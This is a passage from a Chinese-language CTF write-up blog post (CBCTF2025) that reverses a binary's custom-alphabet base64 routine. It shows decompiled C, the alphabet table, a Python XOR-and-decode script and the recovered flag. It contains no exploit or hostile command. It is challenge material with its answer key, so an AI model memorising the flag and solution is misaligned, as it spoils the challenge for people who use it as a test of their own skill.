[esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// [esp+2Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  *p_i = <span class="number">4</span> * ((a2 + <span class="number">2</span>) / <span class="number">3</span>);</span><br><span class="line">  v10 = sub_4079A0(*p_i + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v10 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v15 &lt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="type">unsigned</span> __int8)FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;[v15];</span><br><span class="line">    <span class="keyword">if</span> ( ++v15 &gt;= a2 )</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v7 = (<span class="type">unsigned</span> __int8)FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;[v15++];</span><br><span class="line">    <span class="keyword">if</span> ( v15 &gt;= a2 )</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v6 = (<span class="type">unsigned</span> __int8)FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;[v15++];</span><br><span class="line">    v9 = v6 | (v7 &lt;&lt; <span class="number">8</span>) | (v8 &lt;&lt; <span class="number">16</span>);</span><br><span class="line">    *(_BYTE *)(v11 + v10) = byte_417180[(v9 &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v12 = v11 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v12 + v10) = byte_417180[(v9 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v13 = v12 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v15 &lt;= a2 + <span class="number">1</span> )</span><br><span class="line">      n61 = byte_417180[(v9 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      n61 = <span class="number">61</span>;</span><br><span class="line">    *(_BYTE *)(v13 + v10) = n61;</span><br><span class="line">    v14 = v13 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v15 &lt;= a2 )</span><br><span class="line">      n61_1 = byte_417180[v9 &amp; <span class="number">0x3F</span>];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      n61_1 = <span class="number">61</span>;</span><br><span class="line">    *(_BYTE *)(v14 + v10) = n61_1;</span><br><span class="line">    v11 = v14 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(v10 + *p_i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意自定义base64字符集</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00417180                                   ; char byte_417180[]</span><br><span class="line">.rdata:00417180 30                                byte_417180 db 30h                      ; DATA XREF: sub_401000+FF↑r</span><br><span class="line">.rdata:00417180                                                                           ; sub_401000+11F↑r</span><br><span class="line">.rdata:00417180                                                                           ; sub_401000+14D↑r</span><br><span class="line">.rdata:00417180                                                                           ; sub_401000+182↑r</span><br><span class="line">.rdata:00417181 31 32 33 34 35 36 37 38 39 41…    a123456789abcde db &#x27;123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/&#x27;,0</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义 Base64 表</span></span><br><span class="line">custom_table = <span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/&quot;</span></span><br><span class="line"><span class="comment"># 标准 Base64 表</span></span><br><span class="line">standard_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;FuxNFb|$QXR#Xe#&#125;F#lqZ[`T@Q&amp;&amp;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. XOR 解密 (XOR 0x16)</span></span><br><span class="line">xor_decrypted = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> target:</span><br><span class="line">    xor_decrypted += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ <span class="number">0x16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;XOR解密后:&quot;</span>, xor_decrypted)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 自定义Base64转标准Base64</span></span><br><span class="line">trans = <span class="built_in">str</span>.maketrans(custom_table, standard_table)</span><br><span class="line">standard_base64 = xor_decrypted.translate(trans)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换为标准Base64:&quot;</span>, standard_base64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. Base64解码</span></span><br><span class="line">padding = <span class="number">4</span> - <span class="built_in">len</span>(standard_base64) % <span class="number">4</span></span><br><span class="line"><span class="keyword">if</span> padding != <span class="number">4</span>:</span><br><span class="line">    standard_base64 += <span class="string">&quot;=&quot;</span> * padding</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    decoded = base64.b64decode(standard_base64)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解码后的字节:&quot;</span>, decoded)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag (ASCII):&quot;</span>, decoded.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解码错误:&quot;</span>, e)</span><br></pre></td></tr></table></figure>
<p>得到flag{BAsE_and_jUnK}，<strong>CBCTF{BAsE_and_jUnK}</strong></p>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>Rekjo
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="http://example.com/2025/12/23/CBCTF2025-wp/" title="CBCTF2025_wp">http://example.com/2025/12/23/CBCTF2025-wp/</a>
  </li>
  <li class="post-copyright-license">
      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>


        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/12/23/competition-wp/" rel="prev" title="competition_wp">
                  <i class="fa fa-angle-left"></i> competition_wp
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/12/31/HKCERT-CTF2025/" rel="next" title="HKCERT_CTF2025">
                  HKCERT_CTF2025 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2026</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder"><span id="copyright"> Welcome. All rights reserved. Non-commercial use allowed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a>.</span></span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div><div>
<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
<script>
    var now = new Date();
    function createtime() {
        // 关键修复：将日期格式改为 ISO 8601 (年-月-日)
        var grt = new Date("2025-12-22 00:00:00");
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
    }
    setInterval("createtime()",250);
</script>
</div>


    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
